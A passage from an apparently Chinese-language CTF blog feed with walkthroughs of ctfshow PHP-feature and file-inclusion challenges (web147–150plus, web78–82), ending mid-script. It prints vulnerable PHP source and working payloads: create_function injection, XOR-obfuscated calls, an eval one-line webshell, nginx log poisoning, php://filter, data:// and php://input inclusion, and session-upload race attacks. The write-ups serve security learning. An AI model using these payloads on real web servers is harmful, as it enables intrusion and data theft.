2020-10-19 02:04:38</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>        <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>确保 <code>$ctfshow</code> 只包含小写字母、数字和下划线（正则表达式 <code>^[a-z0-9_]*$</code>）。</p><ul><li><strong><code>i</code></strong>：忽略大小写。</li><li><strong><code>s</code></strong>：使 <code>.</code> 可以匹配换行符。</li><li><strong><code>D</code></strong>：禁用多行模式（<code>^</code> 和 <code>$</code> 只匹配整个字符串的开头和结尾）。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?show=;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);//<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctf=\create_function<br></code></pre></td></tr></table></figure><p>show需要提前进行闭合，后面需要进行注释掉，以便可以正常执行，下面的ctf输入<code>\</code>是为了能够进行绕过，这个函数是用于进行创造一个函数进行执行，详细的可以网上搜索一下</p><h2 id="web148"><a class="markdownIt-Anchor" href="#web148"></a> web148</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 03:52:11</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_ctfshow_fl0g</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>直接进行异或</p><h3 id="0x01-19"><a class="markdownIt-Anchor" href="#0x01-19"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%0c&quot;</span>^<span class="hljs-string">&quot;%60%7f&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=(<span class="hljs-string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="hljs-string">&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;</span>^<span class="hljs-string">&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-19"><a class="markdownIt-Anchor" href="#0x02-19"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=$哈=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;<span class="hljs-variable">$&#123;$哈&#125;</span>[哼](<span class="hljs-variable">$&#123;$哈&#125;</span>[嗯]);&amp;哼=system&amp;嗯=<span class="hljs-built_in">tac</span> f*<br></code></pre></td></tr></table></figure><p>官方预期解</p><h2 id="web149"><a class="markdownIt-Anchor" href="#web149"></a> web149</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 04:34:40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码审计一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是遍历当前目录下的文件是否有叫index.php的，如果有就进行删除</p><p>可以利用这一点进行一句话木马上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf=index.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后回到页面执行一句话得到了具体的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;cat /ctfshow_fl0g_here.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web150"><a class="markdownIt-Anchor" href="#web150"></a> web150</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-19 07:12:57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>既然是非预期题目就用非预期来写，先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?isVIP=TRUE<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctf=/var/log/nginx/access.log&amp;1=system(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>给ua头上个一句话<code>&lt;?php eval($_POST[1]);?&gt;</code>，查看网页源码得到flag</p><p><code>strrpos($ctf, &quot;:&quot;)</code> 是 PHP 中的一个函数调用，它的作用是查找字符串中最后一次出现指定字符的位置。从题目中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">isVIP</span></span>()&#123;<br>       <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;vip?TRUE:FALSE;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>要满足这个限制，所以<code>isVIP</code>进行了限制，只要后面的是不符合的即没有:就行，利用nginx特性，具体对照web4这题，写入日志得到falg</p><h2 id="web150plus"><a class="markdownIt-Anchor" href="#web150plus"></a> web150plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-19 07:12:57</span><br><br>*/<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>error_reporting(0);<br>highlight_file(__FILE__);<br><br>class CTFSHOW&#123;<br>    private <span class="hljs-variable">$username</span>;<br>    private <span class="hljs-variable">$password</span>;<br>    private <span class="hljs-variable">$vip</span>;<br>    private <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;vip = 0;<br>        <span class="hljs-variable">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$this</span>-&gt;secret;<br>    &#125;<br><br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">isVIP</span></span>()&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;vip?TRUE:FALSE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> __autoload(<span class="hljs-variable">$class</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    die(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; strrpos(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===FALSE &amp;&amp; strrpos(<span class="hljs-variable">$ctf</span>,<span class="hljs-string">&quot;log&quot;</span>)===FALSE)&#123;<br>    include(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题把log给禁用了，先上一下官方给的exphttps://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</p><p><a href="https://blog.csdn.net/Kracxi/article/details/122015333">学习文章</a></p><p><code>__autoload($class)</code> 是 PHP 中用于自动加载类的特殊函数。当你试图使用一个尚未定义的类时，PHP 会自动调用这个 <code>__autoload()</code> 函数，并将类名作为参数传递给它。</p><p><code>class_exists($__CTFSHOW__)</code> 是 PHP 中的一个函数调用，用于检查给定的类是否已经定义。</p><h3 id="0x01-20"><a class="markdownIt-Anchor" href="#0x01-20"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?..CTFSHOW..=phpinfo<br></code></pre></td></tr></table></figure><p>我觉得也算非预期，用phpinfo查看，根据特性把_改成了.,搜索<code>ctfshow&#123;</code></p><h3 id="0x02-20"><a class="markdownIt-Anchor" href="#0x02-20"></a> 0x02</h3><p>自己研究下exp吧，我太懒了😋</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php特性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow文件包含</title>
    <link href="/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>前言:炒冷饭也不失一种乐趣。</p><h2 id="web78"><a class="markdownIt-Anchor" href="#web78"></a> web78</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web79"><a class="markdownIt-Anchor" href="#web79"></a> web79</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure><p>原理就是将<?php system("tac flag.php") ?>`进行base64写进去执行</p><h2 id="web80"><a class="markdownIt-Anchor" href="#web80"></a> web80</h2><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=pHp://input<br></code></pre></td></tr></table></figure><p>然后bp发包post执行就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>)?&gt;<br></code></pre></td></tr></table></figure><h2 id="web81"><a class="markdownIt-Anchor" href="#web81"></a> web81</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure><h2 id="web82"><a class="markdownIt-Anchor" href="#web82"></a> web82</h2><p>以下都是条件竞争本人也写的少</p><p>将所有条件的禁用了，只能使用session了。因为在php中我们能够利用的无后缀的文件就是session，我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p><p>讲以下原理，在php5.4引入了一些内容在php.ini里面</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">session.upload<span class="hljs-emphasis">_progress.enable = on</span><br><span class="hljs-emphasis">session.upload_</span>progress.cleanup = on<br>session.upload<span class="hljs-emphasis">_progress.prefix = &quot;upload_</span>progress<span class="hljs-emphasis">_&quot;</span><br><span class="hljs-emphasis">session.upload_</span>progress.name = &quot;PHP<span class="hljs-emphasis">_SESSION_</span>UPLOAD<span class="hljs-emphasis">_PROGRESS&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li><li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li><li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li><li><code>prefix+name</code>将表示为session中的键名;</li><li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li></ul><p>进行大概的分析，<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如在Cookie里设置PHPSESSID=orange,PHP将会在服务器里创建一个文件/tmp/sess_orange。即使没有初始化Session，PHP也会进行初始化，并产生一个键值，这个键值由上面的<code>prefix+name</code>组成，最后被写入sess_文件里面</p><p>这种题目建议用脚本多线程跑，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 